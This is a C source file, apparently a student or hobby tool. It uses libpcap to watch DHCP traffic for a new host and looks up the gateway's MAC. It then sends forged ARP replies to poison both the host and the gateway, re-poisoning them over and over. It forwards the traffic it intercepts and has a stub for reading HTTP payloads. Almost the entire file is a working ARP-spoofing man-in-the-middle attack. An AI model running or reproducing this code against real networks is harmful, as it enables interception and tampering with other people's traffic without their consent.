#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <pcap.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "send_arp.h"

uint8_t hmac[6];
uint32_t* hip;
int success;

int dhcp(char *argv){
    char * dev = argv;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    while(true){
        struct pcap_pkthdr* header;
        const unsigned char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        struct eth_header *eth = (struct eth_header *)packet;
        if(ntohs(eth->eth_type) == 0x0800) {
            struct ip_header *ip = (struct ip_header *)(packet + sizeof(*eth));
            uint16_t ipv4_len = (ip->ipv4_len & 0x0F)<<2;
            if(ip->pid == 17){
                struct udp_header *udp = (struct udp_header *)((uint8_t *)ip + ipv4_len);
                if(ntohs(udp->sport) == 0x0044 && ntohs(udp->dport) == 0x0043){
                    struct dhcp_header *dhcp = (struct dhcp_header *)((uint8_t *)udp + sizeof(*udp));
                    char* option = (char *)((uint8_t *)dhcp + sizeof(*dhcp));
                    while(true){
                        if(*option == 50){
                            uint32_t *h_ip = (uint32_t *)(option+2);
                            printf("find host\n");
                            for(int i=0; i<6; i++){
                                hmac[i] = dhcp->cmac[i];
                            }
                            hip = h_ip;
                            success = 1;
                            return 0;
                        }
                        else if(*option == 255){
                            break;
                        }
                        else{
                            option = (option + *(option+1) + 2);
                        }
                    }
                }
            }
        }
    }
}

int main(int argc, char * argv[]){
    int num=0;
    int re=0;
    char * dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    int fd;
    struct ifreq ifr_m;
    struct ifreq ifr_i;
    unsigned char *mac;
    uint32_t *ip;
    unsigned char *g_mac = (unsigned char *)calloc(6, sizeof(char *));;
    uint32_t g_ip = inet_addr(argv[2]);
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr_m.ifr_addr.sa_family = AF_INET;
    ifr_i.ifr_addr.sa_family = AF_INET;
    strncpy(ifr_m.ifr_name , dev , IFNAMSIZ-1);
    strncpy(ifr_i.ifr_name , dev , IFNAMSIZ-1);
    ioctl(fd, SIOCGIFHWADDR, &ifr_m);
    ioctl(fd, SIOCGIFADDR, &ifr_i);
    close(fd);
    mac = (unsigned char *)ifr_m.ifr_hwaddr.sa_data;
    ip = (uint32_t *)&(((struct sockaddr_in *)&ifr_i.ifr_addr)->sin_addr);
    //----------------mac addr------------------
    printf("Mac : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    printf("IP : %s\n", inet_ntoa(*(struct in_addr *)ip));
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    while(true){
        dhcp(argv[1]);
        if(success==1) {
            num++;
            printf("out while\n");
            break;
        }

    }
    for(int i=0; i<6; i++){
        printf("%02x ", hmac[i]);
    }
    printf("\n");
    printf("%s\n",inet_ntoa(*(struct in_addr *)hip));

    //request gateway mac
    unsigned char* arp_g_packet = (unsigned char *)calloc(42, sizeof(char *));
    arp_g_packet = request(mac, ip, &g_ip);
    pcap_sendpacket(handle, arp_g_packet, 42);
    while (true){
        struct pcap_pkthdr* header;
        const unsigned char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        struct eth_header *eth = (struct eth_header *)packet;
        if(ntohs(eth->eth_type) == 0x0806) {
            struct arp_header *arp = (struct arp_header *)(packet + sizeof(*eth));
            if (ntohs(arp->opcode) == 0x0002 && arp->sip == inet_addr(argv[2]) && arp->dip == *ip ){
                memcpy(g_mac, &eth->smac, sizeof(uint8_t)*6);
                printf("success get gateway mac\n");
                break;
            }
        }
    }
    free(arp_g_packet);

    unsigned char** arp_packet = (unsigned char **)calloc(10, sizeof(char *));

    //request host mac and make host arp packet
    for(int i=0; i<num; i++){
        arp_packet[2*i] = request(mac, ip, hip);
        pcap_sendpacket(handle, arp_packet[2*i], 42);
        int a=1;
        while (true){
            if(a%1000==0){
                pcap_sendpacket(handle, arp_packet[2*i], 42);
                printf("a = %d --retry send packet--\n",a);
            }
            struct pcap_pkthdr* header;
            const unsigned char* packet;
            int res = pcap_next_ex(handle, &header, &packet);
            a++;
            if (res == 0) continue;
            struct eth_header *eth = (struct eth_header *)packet;
            if(ntohs(eth->eth_type) == 0x0806) {
                struct arp_header *arp = (struct arp_header *)(packet + sizeof(*eth));
                if (ntohs(arp->opcode) == 0x0002 && arp->sip == *hip && arp->dip == *ip){
                    printf("success capture packet\n");

                    memcpy(arp_packet[2*i], &eth->smac, sizeof(uint8_t)*6);
                    memcpy(arp_packet[2*i]+28, &g_ip, sizeof(uint8_t)*4);
                    memcpy(arp_packet[2*i]+32, &eth->smac, sizeof(uint8_t)*6);
                    *(arp_packet[2*i]+21) = 0x02;
                    printf("success make host packet\n");
                    arp_packet[(2*i)+1] = request(mac, hip, &g_ip);
                    memcpy(arp_packet[(2*i)+1], g_mac, sizeof(uint8_t)*6);
                    memcpy(arp_packet[(2*i)+1]+32, g_mac, sizeof(uint8_t)*6);
                    *(arp_packet[(2*i)+1]+21) = 0x02;
                    printf("success make gateway packet\n");
                    break;
                }
            }
        }
    }
    //printf("%02x ",arp_packet[0][i]);


    for(int i=0; i<num; i++){
        pcap_sendpacket(handle, arp_packet[2*i], 42);
        pcap_sendpacket(handle, arp_packet[(2*i)+1], 42);
        printf("success get %s\n",inet_ntoa(*(struct in_addr *)hip));
        printf("arp spoofing success\n");
    }
    while (true){
        struct pcap_pkthdr* header;
        const unsigned char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
       re++;
        if(re%500==0){
            for(int i=0; i<2*num; i++){
                pcap_sendpacket(handle, arp_packet[2*i], 42);
                pcap_sendpacket(handle, arp_packet[2*i+1], 42);
            }
            re=0;
        }
        struct eth_header *eth = (struct eth_header *)packet;
        int p=0;
        for(int i=0; i<6; i++){
            if(eth->dmac[i] == 0xff)
                p++;
        }
        if(ntohs(eth->eth_type) == 0x0806) {
            struct arp_header *arp = (struct arp_header *)(packet + sizeof(*eth));
            for(int i=0; i<num; i++){
                if (ntohs(arp->opcode) == 0x0001 && p == 6 && !strncmp((const char *)(packet+6), (const char *)arp_packet[2*i], 6)){
                    for(int j=0; j<2*num; j++){
                        pcap_sendpacket(handle, arp_packet[j], 42);
                        printf("host send arp_packet\n");
                    }
                    printf("-----success ARP broadcast case-----\n");
                }
                if (ntohs(arp->opcode) == 0x0001 && p == 6 && !strncmp((const char *)(packet+6), (const char *)arp_packet[2*i+1], 6)){
                    for(int j=0; j<2*num; j++){
                        pcap_sendpacket(handle, arp_packet[j], 42);
                        printf("gateway send arp_packet\n");
                    }
                    printf("-----success ARP broadcast case-----\n");
                }
                if (ntohs(arp->opcode) == 0x0001 && !strncmp((const char *)(packet+6), (const char *)arp_packet[2*i+1], 6) && !strncmp((const char *)packet, (const char *)(arp_packet[2*i+1]+6), 6) && arp->dip == *hip){
                    pcap_sendpacket(handle, arp_packet[2*i+1], 42);
                    printf("-----success ARP unicast case gateway-----\n",i+1);
                }
                if (ntohs(arp->opcode) == 0x0001 && !strncmp((const char *)(packet+6), (const char *)arp_packet[2*i], 6) && !strncmp((const char *)packet, (const char *)(arp_packet[2*i]+6), 6) && arp->dip == g_ip){
                    pcap_sendpacket(handle, arp_packet[2*i], 42);
                    printf("-----success ARP unicast case host-----\n",i+1);
                }
            }
        }

        if(ntohs(eth->eth_type) == 0x0800){
            struct ip_header *ip = (struct ip_header *)(packet + sizeof(*eth));
            uint16_t ipv4_len = (ip->ipv4_len & 0x0F)<<2;
            for(int i=0; i<num; i++){
                if(!strncmp((const char *)packet, (const char *)mac, 6) && !strncmp((const char *)(packet+6), (const char *)arp_packet[2*i], 6)){

                    memcpy((void *)(packet+6), mac, sizeof(uint8_t)*6);
                    memcpy((void *)packet, g_mac, sizeof(uint8_t)*6);

                    pcap_sendpacket(handle, packet, ntohs(ip->packet_len)+14);

                }
                else if(!strncmp((const char *)packet, (const char *)mac, 6) && !strncmp((const char *)(packet+6), (const char *)arp_packet[2*i+1], 6)){


                    memcpy((void *)(packet+6), mac, sizeof(uint8_t)*6);
                    memcpy((void *)packet, (void *)arp_packet[2*i], sizeof(uint8_t)*6);

                    pcap_sendpacket(handle, packet, ntohs(ip->packet_len)+14);

                }
            }
            if(ip->pid == 6){
                struct tcp_header *tcp = (struct tcp_header *)((uint8_t *)ip + ipv4_len);
                uint16_t tcp_len = (tcp->hlen & 0xF0)>>2;
                if((ntohs(tcp->sport) == 80 || ntohs(tcp->dport) == 80)){
                    char *http_data = (char *)((uint8_t *)tcp + tcp_len);
                }
            }
        }

    }
    pcap_close(handle);
    for(int i=0; i<2*num; i++){
        free(arp_packet[i]);
    }
    return 0;
}
